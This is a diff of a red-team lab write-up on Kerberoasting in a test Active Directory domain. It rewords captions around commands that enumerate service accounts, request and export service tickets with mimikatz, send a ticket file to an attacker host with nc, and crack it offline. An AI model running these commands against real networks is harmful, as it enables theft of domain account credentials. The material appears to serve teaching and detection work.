@@ -32,7 +32,7 @@ Get-NetUser | Where-Object {$_.servicePrincipalName} | fl
 
 ![](../.gitbook/assets/kerberoast-enumeration.png)
 
-Attacker retrieving a kerberos ticker for a user account with `servicePrincipalName` set to `HTTP/dc-mantvydas.offense.local`:
+Attacker requesting a kerberos ticker for a user account with `servicePrincipalName` set to `HTTP/dc-mantvydas.offense.local`- it gets stored in the memory:
 
 {% code-tabs %}
 {% code-tabs-item title="attacker@victim" %}
@@ -45,7 +45,7 @@ New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentL
 
 ![](../.gitbook/assets/kerberoast-kerberos-token.png)
 
-Using kerberos to export the kerberos ticket for cracking:
+Using mimikatz, the attacker extracts kerberos ticket from the memory and exports it to a file for cracking:
 
 {% code-tabs %}
 {% code-tabs-item title="attacker@victim" %}
@@ -57,7 +57,7 @@ mimikatz # kerberos::list /export
 
 ![](../.gitbook/assets/kerberoast-exported-kerberos-tickets.png)
 
-Sending the exported ticket to attacking machine for offline cracking:
+Attacker sends the exported service ticket to attacking machine for offline cracking:
 
 {% code-tabs %}
 {% code-tabs-item title="attacker@victim" %}
@@ -67,7 +67,7 @@ nc 10.0.0.5 443 < C:\tools\mimikatz\x64\2-40a10000-spotless@HTTP~dc-mantvydas.of
 {% endcode-tabs-item %}
 {% endcode-tabs %}
 
-Attacker can now try cracking the password for the the ticket
+Attacker brute forces the password of the service ticket:
 
 {% code-tabs %}
 {% code-tabs-item title="attacker@local" %}
@@ -78,6 +78,8 @@ python2 tgsrepcrack.py pwd kerberoast.bin
 {% endcode-tabs %}
 
 ![](../.gitbook/assets/kerberoast-cracked.png)
+
+
 
 ## Observations
 
